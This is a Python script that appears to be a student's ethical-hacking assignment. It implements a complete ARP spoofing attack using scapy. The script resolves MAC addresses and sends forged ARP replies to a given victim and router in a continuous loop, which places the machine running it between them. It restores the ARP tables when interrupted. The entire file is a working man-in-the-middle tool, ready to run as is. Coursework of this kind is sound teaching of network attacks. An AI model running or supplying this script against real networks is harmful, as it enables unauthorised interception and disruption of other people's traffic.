#!/usr/bin/env python3
# CSCI369 Ethical Hacking Assignment - Q1
# Sheethal Santhanam 2025

from scapy.all import ARP, send, srp, Ether
import sys
import time

# Check for valid input: script requires victim and router IPs
if len(sys.argv) != 3:
    print("Usage: sudo python3 arpspoof.py <Victim_IP> <Router_IP>")
    sys.exit(1)

# Assign victim and router IPs from command line args
victim_ip = sys.argv[1]
router_ip = sys.argv[2]

# Function to resolve MAC address of an IP using ARP request
def get_mac_address(ip):
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_req
    response = srp(arp_broadcast, timeout=2, verbose=False)[0]
    return response[0][1].hwsrc if response else None

# Function to send a spoofed ARP reply to target_ip, pretending to be spoof_ip
def send_spoof_packet(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)
    if target_mac:
        spoofed_arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(spoofed_arp, verbose=False)
        print(f"[DEBUG] Sent spoofed packet to {target_ip} claiming to be {spoof_ip}")

# Function to restore the real MAC bindings after CTRL+C
def restore_arp_table(destination_ip, source_ip):
    dest_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    correct_arp = ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(correct_arp, count=4, verbose=False)
    print(f"[INFO] Restored ARP for {destination_ip} → {source_ip}")

# Main loop for attack
try:
    print("[+] ARP Spoofing started. Press CTRL+C to stop and restore network.")
    while True:
        send_spoof_packet(victim_ip, router_ip)  # Tell victim we are the router
        send_spoof_packet(router_ip, victim_ip)  # Tell router we are the victim
        time.sleep(2)

# Graceful exit on CTRL+C — restore ARP tables
except KeyboardInterrupt:
    print("\n[!] CTRL+C detected. Restoring network...")
    restore_arp_table(victim_ip, router_ip)
    restore_arp_table(router_ip, victim_ip)
    print("[+] ARP tables restored. Exiting.")
